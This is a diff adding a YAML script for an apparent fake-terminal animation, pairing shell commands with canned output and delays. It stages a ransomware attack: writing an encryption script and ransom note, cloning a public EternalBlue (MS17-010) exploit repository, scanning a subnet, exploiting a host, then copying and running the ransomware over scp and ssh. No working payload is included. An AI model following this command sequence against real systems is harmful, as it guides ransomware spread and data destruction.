@@ -1,0 +1,122 @@
+commands:
+  - command: "cd ~/projects/wannacry"
+    messages:
+  - command: "sudo apt-get update"
+    messages:
+      - message: "Get:1 http://security.ubuntu.com/ubuntu focal-security InRelease [114 kB]"
+        delay: 0.3
+        mode: "print"
+      - message: "Hit:2 http://archive.ubuntu.com/ubuntu focal InRelease"
+        delay: 0.1
+        mode: "print"
+      - message: "Get:3 http://archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]"
+        delay: 0.2
+        mode: "print"
+      - message: "Get:4 http://archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]"
+        delay: 0.8
+        mode: "print"
+      - message: "Get:5 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,128 kB]"
+        delay: 0.3
+        mode: "print"
+      - message: "Get:6 http://archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [878 kB]"
+        delay: 0.3
+        mode: "print"
+      - message: "Get:7 http://archive.ubuntu.com/ubuntu focal-updates/multiverse amd64 Packages [21.7 kB]"
+        delay: 0.5
+        mode: "print"
+      - message: "Get:8 http://archive.ubuntu.com/ubuntu focal-updates/restricted amd64 Packages [378 kB]"
+        delay: 0.4
+        mode: "print"
+      - message: "Fetched 2,741 kB in 3s (1,015 kB/s)"
+        delay: 0.05
+        mode: "print"
+      - message: "Reading package lists... Done"
+        delay: 0.2
+        mode: "print"
+  - command: "vi encrypt.py"
+    messages:
+      - message: "Writing encryption script..."
+        delay: 0.5
+        mode: "print"
+  - command: "echo 'Sensitive Information' > sensitive_data.txt"
+    messages:
+      - message: "Creating a test file to encrypt"
+        delay: 0.2
+        mode: "print"
+  - command: "python encrypt.py"
+    messages:
+      - message: "Encrypting file..."
+        delay: 1.0
+        mode: "replace"
+      - message: "File encrypted successfully."
+        delay: 0.5
+        mode: "replace"
+  - command: "nano ransom_note.txt"
+    messages:
+      - message: "Writing ransom note..."
+        delay: 0.5
+        mode: "print"
+  - command: "git clone https://github.com/worawit/MS17-010.git"
+    messages:
+      - message: "Cloning EternalBlue exploit repository..."
+        delay: 2.0
+        mode: "print"
+      - message: "Repository cloned."
+        delay: 0.2
+        mode: "replace"
+  - command: "cd MS17-010"
+    messages:
+      - message: "Navigating to the exploit directory..."
+        delay: 0.2
+        mode: "print"
+  - command: "make"
+    messages:
+      - message: "Compiling the EternalBlue exploit..."
+        delay: 1.5
+        mode: "replace"
+      - message: "Compilation complete."
+        delay: 0.5
+        mode: "replace"
+  - command: "python checker.py 192.168.1.0/24"
+    messages:
+      - message: "Scanning network for vulnerable targets..."
+        delay: 2.0
+        mode: "replace"
+      - message: "192.168.1.5    VULNERABLE"
+        delay: 0.5
+        mode: "print"
+      - message: "192.168.1.8    NOT VULNERABLE"
+        delay: 0.5
+        mode: "print"
+      - message: "192.168.1.15   VULNERABLE"
+        delay: 0.5
+        mode: "print"
+  - command: "python eternalblue_exploit7.py 192.168.1.5 shellcode.bin"
+    messages:
+      - message: "Exploiting target 192.168.1.5..."
+        delay: 2.0
+        mode: "replace"
+      - message: "Exploit successful."
+        delay: 0.5
+        mode: "replace"
+  - command: "scp encrypt.py ransom_note.txt user@192.168.1.5:/tmp/"
+    messages:
+      - message: "Uploading ransomware and ransom note to target..."
+        delay: 1.5
+        mode: "print"
+      - message: "Upload complete."
+        delay: 0.2
+        mode: "replace"
+  - command: "ssh user@192.168.1.5 'python /tmp/encrypt.py && cp /tmp/ransom_note.txt /home/user/'"
+    messages:
+      - message: "Executing ransomware on target..."
+        delay: 2.0
+        mode: "replace"
+      - message: "Ransomware deployed successfully on 192.168.1.5"
+        delay: 0.5
+        mode: "replace"
+  - command: "nano monitor_spread.py"
+    messages:
+      - message: "Writing monitoring script..."
+        delay: 0.5
+        mode: "print"
